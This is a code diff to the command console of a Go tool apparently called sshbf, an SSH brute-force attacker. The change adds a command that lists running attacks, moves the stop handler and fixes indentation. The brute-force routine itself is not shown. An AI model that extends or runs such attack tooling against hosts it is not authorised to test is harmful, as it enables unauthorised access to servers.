@@ -4,6 +4,7 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"github.com/kd5pbo/ipsorter"
 	"log"
 	"net"
 	"net/textproto"
@@ -101,8 +102,8 @@ func accept(l *net.TCPListener, wg sync.WaitGroup) {
 /* Handle an incoming command connection */
 func handle(c *net.TCPConn) {
 	defer c.Close()
-        defer log.Printf("%v ended command connection", c.RemoteAddr())
-        defer wl(c, "Good bye.")
+	defer log.Printf("%v ended command connection", c.RemoteAddr())
+	defer wl(c, "Good bye.")
 	log.Printf("New command connection from %v", c.RemoteAddr())
 	/* Easy readers and writers */
 	r := textproto.NewReader(bufio.NewReader(c))
@@ -115,10 +116,10 @@ func handle(c *net.TCPConn) {
 		wf(c, "sshbf> ")
 		/* Get a line from the client */
 		l, err := r.ReadLine()
-                /* Handle disconnect */
-                if err != nil && err.Error() == "EOF" {
-                        return
-                }
+		/* Handle disconnect */
+		if err != nil && err.Error() == "EOF" {
+			return
+		}
 		/* Handle errors */
 		if err != nil {
 			/* TODO: Handle errors better */
@@ -139,15 +140,17 @@ func handle(c *net.TCPConn) {
 		switch cmd[0] {
 		case "a": /* Attack */
 			f = handleA
-		case "s": /* Stop */
-			f = handleS
 		case "m": /* Max attacks */
 			f = handleM
-		case "q":
-			return
+		case "s": /* Stop */
+			f = handleS
+                case "l": /* List */
+f = handleL
 		case "k":
 			log.Printf("Killed by %v", c.RemoteAddr())
 			os.Exit(0)
+		case "q":
+			return
 		default:
 			wf(c, "Unknown command %v\n", cmd[0])
 			fallthrough
@@ -165,6 +168,7 @@ func handleH(c *net.TCPConn, cmd []string) {
 	wl(c, "\tm - Get or set the maximum number of concurrant attacks "+
 		"against a host")
 	wl(c, "\ts - Stop an attack on a host or hosts")
+	wl(c, "\tl - List attacks in progress")
 	wl(c, "\tk - Kill sshbf")
 	wl(c, "\tq - Exit (quit) this command session")
 	wl(c, "\th - This help")
@@ -182,24 +186,10 @@ func handleA(c *net.TCPConn, cmd []string) {
 	/* Spawn hostmasters for each host on the list */
 	for _, h := range cmd[1:] {
 		h = addDefaultPort(h)
-                log.Printf("[%v] Attacking %v", c.RemoteAddr(), h)
+		log.Printf("[%v] Attacking %v", c.RemoteAddr(), h)
 		wf(c, "Attacking %v\n", h)
+		WG.Add(1)
 		go hostmaster(h)
-	}
-}
-
-/* Stop an attack in progress */
-func handleS(c *net.TCPConn, cmd []string) {
-	/* Usage */
-	if 1 == len(cmd) {
-		wl(c, "Stop Usage:")
-		wl(c, "\ta host [host [host...]]")
-		wl(c, "stops an attack on a host or hosts.")
-	}
-	/* Spawn hostmasters for each host on the list */
-	for _, h := range cmd[1:] {
-		h = addDefaultPort(h)
-		wc(c, h, "s", false)
 	}
 }
 
@@ -227,6 +217,38 @@ func handleM(c *net.TCPConn, cmd []string) {
 	}
 }
 
+/* Send the list of running attacks */
+func handleL(c *net.TCPConn, cmd []string) {
+        /* Get the list of keys */
+        tasks := C2CHANS.Keys()
+        /* Sort */
+        i, s := ipsorter.Sort(tasks, true)
+        stasks := append(i, s...)
+        /* Header */
+        wf(c, "%v attacks:\n", len(stasks))
+        wf(c, "%4v %32v %4v\n", "#", "Target", "m")
+        /* Print each target */
+        for i, t := range stasks {
+                m := wc(c, t, "m", true)
+                wf(c, "%4v %32v %4v\n", i, t, m)
+        }
+}
+
+/* Stop an attack in progress */
+func handleS(c *net.TCPConn, cmd []string) {
+	/* Usage */
+	if 1 == len(cmd) {
+		wl(c, "Stop Usage:")
+		wl(c, "\ta host [host [host...]]")
+		wl(c, "stops an attack on a host or hosts.")
+	}
+	/* Spawn hostmasters for each host on the list */
+	for _, h := range cmd[1:] {
+		h = addDefaultPort(h)
+		wc(c, h, "s", false)
+	}
+}
+
 /* Write a string to a tcp connection, printf-style */
 func wf(c *net.TCPConn, f string, a ...interface{}) {
 	/* Make a string */
@@ -240,7 +262,7 @@ func wl(c *net.TCPConn, s string) {
 	wf(c, "%v\n", s)
 }
 
-/* Write a command to a channel and optionally get a response */
+/* Write a command to a channel and, if res is true, get a response */
 func wc(c *net.TCPConn, cname string, s string, res bool) string {
 	/* Lock the C2CHAN for reading */
 	C2CHANL.RLock()
